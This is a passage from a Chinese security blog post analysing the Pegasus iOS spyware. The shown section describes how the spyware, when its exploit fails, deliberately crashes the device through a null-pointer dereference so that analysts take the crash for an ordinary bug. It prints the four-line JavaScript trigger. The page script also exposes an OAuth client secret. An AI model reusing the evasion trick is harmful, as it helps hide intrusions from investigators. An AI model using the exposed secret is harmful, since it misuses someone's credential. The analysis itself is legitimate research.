<h4 id="回避检测"><a href="#回避检测" class="headerlink" title="回避检测"></a>回避检测</h4><p>当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况可以快速确定这个BUG为非法空指针引用而不会怀疑为恶意攻击。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"a"</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
    <span id="busuanzi_container_page_pv">
  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
	</span>
      <a data-url="http://finsenty54.github.io/2019/04/16/pegasus分析/" data-id="cjunihj1j0005e0w8ym26tj8r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ios/">ios</a></li></ul>

    </footer>
  </div>
  

    
    <div id="git"></div>
<link rel="stylesheet" href="https://jjeejj.github.io/css/gitment.css">
<script src="https://jjeejj.github.io/js/gitment.js"></script>
<script>
var gitment =new Gitment({
	id: 'Tue Apr 16 2019 08:54:59 GMT+0000',
	owner: "Finsenty54",
	repo: "finsenty54.github.io",
	oauth: {
		client_id: "b7fda5001654b9511380",
		client_secret: "86d94c8d960fea5bbe4c4e8e7c3ea549a76ad893",
	},
})
gitment.render('git')
</script>
    
      
    
<nav id="article-nav">
  
  
    <a href="/2019/03/29/penetration-test-report-interpretation/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">penetration test report interpretation</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ios/">ios</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/penetation-test/">penetation test</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/04/16/pegasus分析/">pegasus分析</a>
          </li>
        
          <li>
            <a href="/2019/03/29/penetration-test-report-interpretation/">penetration test report interpretation</a>
          </li>
        
          <li>
            <a href="/2019/03/16/Docker学习笔记/">Docker学习笔记</a>
          </li>
        
          <li>
            <a href="/2019/03/02/xss/">XSS 20关挑战</a>
          </li>
        
          <li>
            <a href="/2019/02/27/sqli-labs/">sqli-labs(less-1__less-22)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
<div class="widget-wrap">
    <h3 class="widget-title">链接</h3>
    <div class="widget">
      <li><a href="https://github.com/Finsenty54" title="Finsenty54's Blog">我的github</a></li>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 finsenty54<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
	</span>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>